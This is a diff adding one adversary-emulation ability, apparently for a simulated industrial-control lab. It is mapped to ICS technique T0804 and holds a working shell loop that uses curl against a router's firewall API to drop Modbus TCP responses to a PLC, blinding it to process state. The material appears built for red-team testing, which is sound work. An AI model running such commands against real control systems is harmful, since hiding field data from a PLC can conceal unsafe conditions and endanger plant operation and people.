@@ -1,0 +1,24 @@
+---
+
+- id: b8c9d0e1-8888-8888-8888-000000000005
+  name: Router - Block Modbus Reporting Messages
+  description: |
+    Add iptables FORWARD rules to DROP Modbus TCP responses from
+    simulation devices back to the PLC, blinding the PLC to the
+    actual process state.
+  tactic: inhibit-response-function
+  technique_id: T0804
+  technique_name: Block Reporting Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      for src_ip in 10 11 12 13 14 15; do
+        curl -s -b /tmp/router.jar
+        -X POST "http://192.168.90.200:5000/firewall/add"
+        -d "src_ip=192.168.95.$src_ip&dst_ip=192.168.95.2&protocol=tcp&dport=502&action=DROP"
+        2>/dev/null;
+      done &&
+      curl -s -b /tmp/router.jar
+      -X POST "http://192.168.90.200:5000/firewall/apply" 2>/dev/null &&
+      echo "MODBUS_RESPONSES_BLOCKED: PLC receives no field data"
